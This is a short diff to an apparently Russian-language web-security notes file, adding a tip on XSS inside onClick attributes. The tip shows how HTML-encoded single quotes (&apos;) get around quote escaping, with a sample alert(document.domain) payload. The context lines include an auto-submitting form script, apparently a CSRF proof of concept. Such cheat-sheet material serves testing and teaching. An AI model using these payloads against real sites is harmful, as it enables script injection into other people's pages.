@@ -158,3 +158,10 @@ $(window).on('hashchange', function(){
 <script>
     document.forms[0].submit();
 </script>
+
+### В аттрибутах по типу onClick, где выполняется javacsript код в случае экранирования одинарной  кавычки можно внедрить 
+```js
+&apos;-alert(document.domain)-&apos;
+```
+* apos - аналог одинарной кавычки
+* -alert сработает как выражение, т.к в контексте атрибута onClick
